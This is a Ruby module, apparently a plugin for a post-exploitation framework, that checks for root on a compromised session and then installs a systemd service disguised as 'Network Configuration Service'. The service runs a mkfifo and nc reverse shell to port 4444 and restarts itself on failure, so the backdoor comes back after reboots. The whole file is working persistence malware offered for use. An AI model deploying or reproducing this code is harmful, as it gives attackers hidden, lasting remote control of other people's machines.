module SystemdReverseShell
  def self.run(fm, sid, client)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping systemd service.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end

    service_name = "netconf.service"
    service_path = "/etc/systemd/system/#{service_name}"

    client.print_good("Session #{sid} is root. Deploying systemd reverse shell...")

    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
    attacker_port = 4444

    # Evitar duplicação
    if session.shell_command_token("systemctl list-unit-files | grep -q '^#{service_name}' && echo 'EXISTS'").include?('EXISTS')
      client.print_status("Systemd service already exists. Skipping.")
      return
    end

    service_content = <<~SERVICE
      [Unit]
      Description=Network Configuration Service
      After=network.target

      [Service]
      Type=simple
      ExecStart=/bin/bash -c 'rm -f /tmp/.s; mkfifo /tmp/.s; /bin/sh -i < /tmp/.s 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.s'
      Restart=on-failure
      RestartSec=10

      [Install]
      WantedBy=multi-user.target
    SERVICE

    write_cmd = <<~SHELL
      cat > '#{service_path}' << 'EOF'
      #{service_content}
      EOF
      chmod 644 '#{service_path}'
      systemctl daemon-reload
      systemctl enable #{service_name}
      systemctl start #{service_name}
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("Systemd reverse shell deployed and enabled!")
    rescue => e
      client.print_error("Failed to deploy systemd service: #{e.message}")
    end
  end
end
